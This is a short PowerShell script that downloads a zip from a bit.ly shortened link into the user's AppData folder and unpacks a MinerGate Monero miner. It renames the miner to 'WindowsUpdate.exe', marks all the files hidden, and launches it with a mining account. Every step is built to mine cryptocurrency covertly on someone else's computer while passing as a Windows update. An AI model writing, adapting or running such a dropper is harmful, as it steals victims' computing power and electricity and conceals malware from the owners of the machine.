$url = "https://bit.ly/31vjJMZ"

$output = "C:\Users\$env:UserName\AppData\Local\1\1.zip"

New-Item -ItemType directory -Path C:\Users\$env:UserName\AppData\Local\1

Invoke-WebRequest -Uri $url -OutFile $output

expand-archive -path $output -destinationpath C:\Users\$env:UserName\AppData\Local\1\unzipped

Rename-Item -Path "C:\Users\$env:UserName\AppData\Local\1\unzipped\minergate-cli.exe" -NewName "WindowsUpdate.exe"


Get-ChildItem -path "C:\Users\$env:UserName\AppData\Local\1" -Recurse -Force | foreach {$_.attributes = "hidden"}



& C:\Users\$env:UserName\AppData\Local\1\unzipped\WindowsUpdate.exe --user m0ner0@hotmail.com --xmr 2



